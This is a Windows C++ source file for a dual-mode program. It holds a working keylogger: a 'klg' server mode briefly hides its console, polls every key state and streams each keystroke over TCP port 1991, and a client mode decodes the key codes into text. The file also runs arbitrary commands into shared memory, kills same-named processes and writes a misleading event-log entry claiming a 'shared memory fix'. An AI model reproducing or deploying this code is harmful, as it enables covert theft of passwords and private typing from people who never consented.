#if       _WIN32_WINNT < 0x0500
  #undef  _WIN32_WINNT
  #define _WIN32_WINNT   0x0500
#endif

#include <boost/interprocess/shared_memory_object.hpp>
#include <boost/interprocess/mapped_region.hpp>
#include <cstdio>
#include <cstring>
#include <winsock2.h>
#include <windows.h>
#include <Tlhelp32.h>

#define ERROR_CODE 1

using namespace boost::interprocess;

class MemShared
{
    const char* name;
    void killOtherRunningProcesses(char*) const;
    public:
        MemShared(const char* n, char* argv0) : name(n){shared_memory_object::remove(name);killOtherRunningProcesses(argv0);}
        ~MemShared(){shared_memory_object::remove(name);}
};

void MemShared::killOtherRunningProcesses(char* argv0) const
{
    /***
        argv0 contains full path
        filename contains program name(the last part after \ delimiter)
    ***/
    char filename[strlen(argv0) + 1];
    char* tmp = strtok(argv0, "\\");
    while(tmp != NULL)
    {
        strcpy(filename, tmp);
        tmp = strtok(NULL, "\\");
    }
    /***
    ***/

    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(pEntry);
    bool hRes = Process32First(hSnapShot, &pEntry);

    while(hRes)
    {
        if(strcmp(pEntry.szExeFile, filename) == 0)
        {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, (DWORD)pEntry.th32ProcessID);
            if(hProcess != NULL && pEntry.th32ProcessID != GetCurrentProcessId())
            {
                TerminateProcess(hProcess, 9);
                CloseHandle(hProcess);
            }
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
}

bool fixMem6005issue()
{
    bool result = false;

    HANDLE hEventLog = RegisterEventSource(NULL, "EventLog");
    if(hEventLog)
    {
        const char* msg = "Shared memory fix for 6005";
        if(ReportEvent(hEventLog, EVENTLOG_INFORMATION_TYPE, 0, 6005, NULL, 1, 0, &msg, NULL))
            result = true;

        DeregisterEventSource(hEventLog);
    }

    return result;
}

bool spawn(char* cmd)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if(!CreateProcess(NULL, cmd, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        fprintf(stderr, "CreateProcess failed (%li).\n", GetLastError());
        return false;
    }

    //WaitForSingleObject(pi.hProcess, INFINITE); // do not wait for child process to finish

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}

int main(int argc, char *argv[])
{
    // Name of the controlled memory region
    const char* name = "Shared Memory";
    if(argc == 4 && strcmp(argv[1], "spawn") == 0)
    {
        char cmd[strlen(argv[0]) + strlen(argv[2]) + strlen(argv[3]) + 5];
        strcpy(cmd, argv[0]);
        strcat(cmd, " ");
        strcat(cmd, argv[2]);
        strcat(cmd, " ");
        strcat(cmd, "\"");
        strcat(cmd, argv[3]);
        strcat(cmd, "\"");
        printf("%s\n", cmd);
        spawn(cmd);
        printf("Spawned...\n");
        return 0;
    }
    if(argc == 3 && strcmp(argv[1], "shm") == 0)
    {
        if(strcmp(argv[2], "patch") == 0)
        {
            if(!fixMem6005issue())
            {
                fprintf(stderr, "Unable to patch\n");
                return ERROR_CODE;
            }
            fprintf(stderr, "Patch applied successfully\n");
        }
        try
        {
            char path[strlen(argv[2]) + 1];
            strcpy(path, argv[2]);
            FILE *file = _popen(path, "r");
            if(file == NULL)
            {
                fprintf(stderr, "Error occurred while executing given argument\n");
                return ERROR_CODE;
            }

            MemShared sho(name, argv[0]);
            const unsigned long _MEM_SIZE = 100000000;

            shared_memory_object shm(create_only, name, read_write);
            shm.truncate(_MEM_SIZE);
            mapped_region region(shm, read_write);

            int* _MEM_COUNT = (int*)region.get_address();
            *_MEM_COUNT = 0;

            char* _MEM_FLAG = (char*)_MEM_COUNT + sizeof(*_MEM_COUNT);
            *_MEM_FLAG = '\0';

            char* _MEM_START_USABLE = (char*)_MEM_COUNT + sizeof(*_MEM_COUNT) + sizeof(*_MEM_FLAG);
            const unsigned long _MEM_SIZE_USABLE = _MEM_SIZE - sizeof(*_MEM_COUNT) - sizeof(*_MEM_FLAG);

            memset(_MEM_START_USABLE, '\0', _MEM_SIZE_USABLE);

            const unsigned long output_len = fread(_MEM_START_USABLE, sizeof(*_MEM_START_USABLE), _MEM_SIZE_USABLE, file);
            pclose(file);
            if(output_len == 0)
            {
                fprintf(stderr, "Error occurred while reading the argument\n");
                return ERROR_CODE;
            }

            while(memchr(_MEM_FLAG, '*', 1) == NULL)
            {
                Sleep(1);
            }
        }
        catch(const interprocess_exception& err)
        {
            fprintf(stderr, "%s", err.what());
            return ERROR_CODE;
        }
    }
    else if(argc == 3 && strcmp(argv[1], "klg") == 0)
    {
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        Sleep(5000);
        ShowWindow(GetConsoleWindow(), SW_RESTORE);

        while(true)
        {
            WSADATA WsaDat;
            if(WSAStartup(MAKEWORD(2, 2), &WsaDat) != 0)
            {
                fprintf(stderr, "Error: Winsock initialization failed\n");
                WSACleanup();
                return ERROR_CODE;
            }
            SOCKET Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
            if(Socket==INVALID_SOCKET)
            {
                fprintf(stderr, "Error: Socket creation failed\n");
                WSACleanup();
                return ERROR_CODE;
            }
            SOCKADDR_IN serverInf;
            serverInf.sin_family=AF_INET;
            serverInf.sin_addr.s_addr=INADDR_ANY;
            serverInf.sin_port=htons(1991);

            if(bind(Socket,(SOCKADDR*)(&serverInf),sizeof(serverInf))==SOCKET_ERROR)
            {
                fprintf(stderr, "Unable to bind socket\n");
                WSACleanup();
                return ERROR_CODE;
            }

            listen(Socket, 1);
            SOCKET TempSock = INVALID_SOCKET;
            while(TempSock == INVALID_SOCKET)
            {
                printf("Waiting for incoming connections...\n");
                Sleep(5000);
                TempSock=accept(Socket,NULL,NULL);
            }
            Socket = TempSock;
            printf("Client connected!\n");
            char buffer[2];
            bool stop = false;

            while(!stop)
            {
                memset(buffer, '\0', sizeof(buffer) / sizeof(char));
                for(int i = 0x08; i <= 0xDF; i++)
                {
                    if(GetAsyncKeyState(i) & 0x0001)
                    {
                        buffer[0] = (char) i;
                        if(send(Socket, buffer, 1, 0) == SOCKET_ERROR)
                            stop = true;
                    }
                }
            }
            shutdown(Socket, SD_SEND);
            closesocket(Socket);
            WSACleanup();
        }
    }
    else if(argc == 2 && strcmp(argv[1], "klg") == 0)
    {
        WSADATA WsaDat;
        if(WSAStartup(MAKEWORD(2, 2), &WsaDat) != 0)
        {
            fprintf(stderr, "Error: Winsock initialization failed\n");
            WSACleanup();
            return ERROR_CODE;
        }
        SOCKET Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
        if(Socket==INVALID_SOCKET)
        {
            fprintf(stderr, "Error: Socket creation failed\n");
            WSACleanup();
            return ERROR_CODE;
        }
        struct hostent *host;
        if((host = gethostbyname("localhost")) == NULL)
        {
            fprintf(stderr, "Error: Failed to resolve hostname\n");
            WSACleanup();
            return ERROR_CODE;
        }

        SOCKADDR_IN SockAddr;
        SockAddr.sin_port=htons(1991);
        SockAddr.sin_family=AF_INET;
        SockAddr.sin_addr.s_addr=*((unsigned long*)host->h_addr);

        while(connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0)
        {
            //fprintf(stderr, "Error: Failed to establish connection with server\n");
            Sleep(1000);
        }
        printf("Connected to server!!!\n");

        char buffer[2];
        std::string key_str;
        memset(buffer, '\0', sizeof(buffer) / sizeof(char));
        while(recv(Socket, buffer, 1, 0) > 0)
        {
            key_str.clear();
            switch((int) buffer[0])
            {
                case -34:
                    key_str = "'";
                    break;
                case -35:
                    key_str = "]";
                    break;
                case -36:
                    key_str = "\\";
                    break;
                case -37:
                    key_str = "[";
                    break;
                case -64:
                    key_str = "`";
                    break;
                case -65:
                    key_str = "/";
                    break;
                case -66:
                    key_str = ".";
                    break;
                case -67:
                    key_str = "-";
                    break;
                case -68:
                    key_str = ",";
                    break;
                case -69:
                    key_str = "=";
                    break;
                case -70:
                    key_str = ";";
                    break;
                case 8:
                    key_str = "[backspace]";
                    break;
                case 9:
                    key_str = "[tab]";
                    break;
                case 13:
                    key_str = "[enter]";
                    break;
                case 16:
                    key_str = "[shift]";
                    break;
                case 17:
                    key_str = "[ctrl]";
                    break;
                case 18:
                    key_str = "[alt]";
                    break;
                case 20:
                    key_str = "[caps lock]";
                    break;
                case 27:
                    key_str = "[esc]";
                    break;
                case 32:
                    key_str = "[space]";
                    break;
                case 37:
                    key_str = "[left arrow]";
                    break;
                case 38:
                    key_str = "[up arrow]";
                    break;
                case 39:
                    key_str = "[right arrow]";
                    break;
                case 40:
                    key_str = "[down arrow]";
                    break;
                case 46:
                    key_str = "[delete]";
                    break;
                case 48:
                    key_str = "0";
                    break;
                case 49:
                    key_str = "1";
                    break;
                case 50:
                    key_str = "2";
                    break;
                case 51:
                    key_str = "3";
                    break;
                case 52:
                    key_str = "4";
                    break;
                case 53:
                    key_str = "5";
                    break;
                case 54:
                    key_str = "6";
                    break;
                case 55:
                    key_str = "7";
                    break;
                case 56:
                    key_str = "8";
                    break;
                case 57:
                    key_str = "9";
                    break;
                case 81:
                    key_str = "q";
                    break;
                case 87:
                    key_str = "w";
                    break;
                case 69:
                    key_str = "e";
                    break;
                case 82:
                    key_str = "r";
                    break;
                case 84:
                    key_str = "t";
                    break;
                case 89:
                    key_str = "y";
                    break;
                case 85:
                    key_str = "u";
                    break;
                case 73:
                    key_str = "i";
                    break;
                case 79:
                    key_str = "o";
                    break;
                case 80:
                    key_str = "p";
                    break;
                case 65:
                    key_str = "a";
                    break;
                case 83:
                    key_str = "s";
                    break;
                case 68:
                    key_str = "d";
                    break;
                case 70:
                    key_str = "f";
                    break;
                case 71:
                    key_str = "g";
                    break;
                case 72:
                    key_str = "h";
                    break;
                case 74:
                    key_str = "j";
                    break;
                case 75:
                    key_str = "k";
                    break;
                case 76:
                    key_str = "l";
                    break;
                case 90:
                    key_str = "z";
                    break;
                case 88:
                    key_str = "x";
                    break;
                case 67:
                    key_str = "c";
                    break;
                case 86:
                    key_str = "v";
                    break;
                case 66:
                    key_str = "b";
                    break;
                case 78:
                    key_str = "n";
                    break;
                case 77:
                    key_str = "m";
                    break;
                default:
                    break;
            }
            printf("%s", key_str.c_str());
        }

        shutdown(Socket, SD_RECEIVE);
        closesocket(Socket);
        WSACleanup();
    }
    else if(argc == 2 && strcmp(argv[1], "shm") == 0)
    {
        try
        {
            shared_memory_object shm(open_only, name, read_write);
            mapped_region region(shm, read_write);
            int* _MEM_COUNT = (int*)region.get_address();
            char* _MEM_FLAG = (char*)_MEM_COUNT + sizeof(*_MEM_COUNT);
            char* _MEM_START_USABLE = (char*)_MEM_COUNT + sizeof(*_MEM_COUNT) + sizeof(*_MEM_FLAG);

            char buffer[1000];
            memset(buffer, '\0', sizeof(buffer));

            memcpy(buffer, _MEM_START_USABLE + *_MEM_COUNT * (sizeof(buffer) - 1), sizeof(buffer) - 1);
            if(strlen(buffer) == 0)
            {
                fprintf(stderr, "Buffer is empty\n");
                return ERROR_CODE;
            }
            else if(strlen(buffer) == sizeof(buffer) - 1)
            {
                *_MEM_COUNT += 1;
            }
            else
            {
                *_MEM_FLAG = '*';
            }
            printf("%s", buffer);
        }
        catch(const interprocess_exception& err)
        {
            fprintf(stderr, "%s", err.what());
            return ERROR_CODE;
        }
    }
    else
    {
        fprintf(stderr, "Server Usage: %s [spawn?] [shm] [cmd]\n", argv[0]);
        fprintf(stderr, "Server Usage: %s [spawn?] [klg] [args]\n", argv[0]);
        fprintf(stderr, "Client Usage: %s [mode(shm|klg)]\n", argv[0]);
        return ERROR_CODE;
    }

    return 0;
}
